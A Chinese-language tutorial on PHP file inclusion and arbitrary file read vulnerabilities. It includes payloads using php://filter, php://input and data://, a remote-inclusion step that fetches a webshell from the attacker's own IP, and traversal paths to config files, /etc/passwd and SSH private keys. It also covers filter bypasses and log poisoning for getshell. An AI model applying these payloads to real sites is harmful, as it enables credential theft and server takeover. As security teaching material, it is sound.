文件包含和任意文件读取

文件包含

一、概念

和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。

开发者使用文件包含函数（包含的来源），用户可控传入文件路径，未经过滤随意读取本地文件或执行恶意代码的漏洞。

特征：

?file=

?page=

?path=

?filename=

?template=

?load=

?module=

Url中常有这些，则极有可能含有文件包含漏洞

二、分类

以PHP为例,常用的文件包含函数有以下四种

include(),require(),include_once(),require_once()


height=”1.4597222222222221in”}

require() 和 include() 函数的区别：使用 require()
函数包含文件时，只要程序执

行，立即调用文件，而 include() 只有程序执行到该函数时才调用 。

  1. 漏洞利用

    文件包含漏洞分为本地文件包含漏洞（ Local File
    include,LFI）与远程文件包含漏洞(Remote Fileinclude,RFI);

    检验文件包含漏洞是否存在，可以尝试php伪协议：

    伪协议用途

    php://filter：读取文件源码

    php://input：执行 POST 数据中的 PHP 代码

    data://：直接写入代码执行

    举例：

    php://filter/convert.base64-encode/resource=index.php

    若页面返回文件的Base64编码内容，则可能存在本地文件包含漏洞。

    协议头 : php://filter 告诉
    PHP别找文件，直接用内置的过滤器功能处理数据(还有一个区别）

    过滤器参数 ：/read=convert.base64-encode
    指定具体操作：读取时，把内容转换成 Base64

    目标文件： /resource=index.php 指定操作对象：当前目录下的 index.php

    预期结果如下：


    height=”3.0118055555555556in”}

  1. 本地文件包含漏洞（LFI）

    指通过相对路径/绝对路径 的方式能打开并包含
    本地文件的漏洞，大部分情况遇到的文件包含漏洞都是 LFI

    **相对路径：**从当前网页文件夹开始往前推，例如?page=../../config.php

    **绝对路径：**直接写明硬盘完整位置，不从当前文件夹找，比如：C:\windows\win.ini 、 D:\www\index.php

    可以先在本地上传一个图片马，并确定其上传路径，然后利用../进行访问，从而激活木马

  2. 远程文件包含漏洞（RFL）

    让服务器去包含你指定的远程网址上的文件，直接执行你的代码。

**条件：**当 allow_url_fopen=On、allow_url_include=On两个条件同时为 On
允许远程包含文件;（也正因为这一条件，让远程文件包含并不常用）

利用 php://input 和 data:// 这两个伪协议执行代码

步骤：

1. 你在自己服务器/网盘放一个文件： shell.txt ，文件中包含木马

2. 构造 payload：?file=http://你的IP/shell.txt 然后进行访问

3. 目标服务器执行你远程的代码，直接拿 shell

注：

?file=php://input，然后 POST 提交：<?php phpinfo();?>

作用：php://input 可以读取 POST 提交的原始数据，在文件包含里常被用来执行
POST 中的 PHP 代码。

四、文件包含漏洞绕过

**1.过滤../
目录穿越字符;**双写绕过，通过.…//构造，代码替换一次后，自动还原为../。

2.自动拼接文件后缀:%00空字符截断（适用于PHP5.3.4以下版本），阻断后缀拼接，直接包含目标文件。
3.限制固定包含目录:使用绝对路径直接定位系统文件，跳过目录限制。

**4.过滤路径斜杠/:**将../替换为..\，用反斜杠实现目录穿越。

任意文件读取

区别：文件包含的作用是执行木马（拿服务器权限shell），而任意文件读取的作用是读取本地的所有文件而不执行

注意，如果使用路径穿越的方式攻击文件包含和任意文件读取的payload是一样的，产生什么样的攻击效果，取决于该网站存在哪一种漏洞

如果有网站两种漏洞同时存在，则这样区分：

· 填在 ?page= 或 ?file= 里 → 走文件包含。

· 填在 ?path= 或 ?download= 里 → 走任意文件读取。

攻击方式（这个无需判断，如果存在该漏洞，直接攻击，它就会直接显示）：

注：读取 PHP 源码（不执行，只看代码）必须用：php://filter
伪协议，如：?file=php://filter/convert.base64-encode/resource=config.php

1. 读数据库账号密码

 ../../config.php 、 database.php 

直接拿到 mysql 账号密码，连数据库脱库

2. 读网站后台密钥、微信支付密钥、cookie盐值

3. 读 linux 敏感文件

 /etc/passwd  看服务器用户

 /root/.ssh/id_rsa  ssh私钥，直接登录服务器

4. 读 windows 敏感

 C:\Windows\System32\drivers\etc\hosts 

网站配置、内网地址

5. 读日志文件

apache/nginx日志，找网站路径、内网IP

补充：

为什么有时候直接访问 ?file=/etc/passwd 页面空白、不显示内容？

• **PHP 代码被解析执行：**直接包含 .php
源码时，服务器会执行而不是显示内容，所以页面空白。

**内容含特殊字符 /
乱码：**像二进制文件、图片、带不可见字符的文件，浏览器直接渲染会一片空白。

• **open_basedir 限制：**PHP 配置禁止跨目录访问，导致无法读取 /etc
等系统目录。

• **权限不足：**Web 进程用户（如 www-data）没有该文件的读权限。

• **被 WAF / 过滤规则拦截：**检测到 ../、etc/passwd 等关键词直接返回空或
403。

直接包含 /etc/passwd 时：

文件内容全是文本，没有 PHP 代码

浏览器会尝试渲染这些文本，但里面有大量换行、特殊字符

有些环境会直接把文本当成 HTML 解析，导致看不见内容

什么场景下可以用 日志包含 getshell？

条件

  1. 存在 本地文件包含 LFI

  2. 能猜到或读到 Web 日志路径（Apache/Nginx 日志）

  3. Web 服务对日志文件有可读权限

原理

  1. 日志会记录用户请求的内容，比如 UA、URL、Referer

  2. 我们在请求里写入一句话木马：<?php phpinfo();?>

  3. 这句话会被写入日志文件

  4. 再用 LFI 包含这个日志文件

  5. PHP 就会把日志里的代码当成 PHP 执行，从而 getshell

    只给LFI，不能 RFI、不能上传文件，除了日志包含，还有哪些常见
    getshell 方式？

  1. Session 文件包含（往 Session 里写代码再包含）

  2. phpinfo 配合文件上传临时文件包含

  3. 环境变量、进程内存、environ 等也可以

    如何利用data://伪协议执行代码？

    ?file=data://text/plain,<?php phpinfo();?>

原理

  • data:// 是一个流包装器，可以直接把后面的内容当作 “文件内容”
    解析执行。

  • text/plain 声明内容是纯文本，避免编码问题。

  • 后面直接写 PHP 代码，服务器会包含并执行这段代码。

适用条件

  • 必须开启 allow_url_fopen = On（大部分环境默认开启）。

  • 必须存在文件包含漏洞（LFI），且代码没有过滤 data:// 协议。（如果
    data:// 被过滤，可以用base64 编码绕过）
